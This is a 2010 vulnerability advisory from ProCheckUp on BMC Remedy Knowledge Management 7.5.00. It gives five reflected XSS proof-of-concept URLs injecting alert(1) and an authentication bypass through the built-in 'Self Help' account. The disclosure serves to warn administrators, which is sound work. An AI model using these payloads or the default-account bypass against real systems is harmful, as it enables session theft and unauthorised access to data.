PR10-13: Multiple XSS and Authentication flaws within BMC Remedy
Knowledge Management

Vulnerability found: 17th July 2010

Vendor informed:

Vulnerability fixed:

Severity: High

Description:

BMC Remedy Knowledge Management provides service desk analysts with a
knowledge base of easy-to-find solutions and gives users self-service
search options to help them resolve issues on their own. ProCheckUp has
discovered that multiple Remedy Knowledge Management pages are
vulnerable to reflective XSS attacks, a built in self help account
allows for authentication bypass.

Version: 7.5.00    - http://www.bmc.com/


1) The following demonstrate the reflective XSS flaws

https://target-domain.foo/rkm/external.jsp?doc='%3balert(1)//&user=Self+Help

https://target-domain.foo/rkm/search.jsp?user=Self+Help&startDate=\'%3balert(1)//

https://target-domain.foo/rkm/usersettings.jsp?"><script>alert(1)</script>

https://target-domain.foo/rkm/viewdoc.jsp?doc=><script>alert(1)</script>&user=Self%20Help

Works on IE - login screen referrer XSS
https://target-domain.foo/rkm/AttachmentServlet?="><script>alert(1)</script>

Consequences:
An attacker may be able to cause execution of malicious scripting code
in the browser of a user who clicks on a link to Remedy Knowledge
Management based site. Such code would run within the security context
of the target domain. This type of attack can result in non-persistent
defacement of the target site, or the redirection of confidential
information (i.e.: session IDs) to unauthorised third parties.

2) Remedy Knowledge  Management is vulnerable to authentication bypass
by using a built in default account. (user=Self%20Help)

https://target-domain.foo/rkm/index.jsp?user=Self%20Help

The following directory requires a password to authenticate only
https://target-domain.foo/rkm/configuration


Consequences:
An attacker may be able to gain access to data held within a Remedy
Knowledge Managment based site.


Fix:
.

References:
http://www.procheckup.com/Vulnerabilities.php

Credits: Richard Brain of ProCheckUp Ltd (www.procheckup.com)

Legal:
Copyright 2010 Procheckup Ltd. All rights reserved.

Permission is granted for copying and circulating this Bulletin to the
Internet community for the purpose of alerting them to problems, if and
only if, the Bulletin is not edited or changed in any way, is attributed
to Procheckup, and provided such reproduction and/or distribution is
performed for non-commercial purposes.

Any other use of this information is prohibited. Procheckup is not
liable for any misuse of this information by any third party.
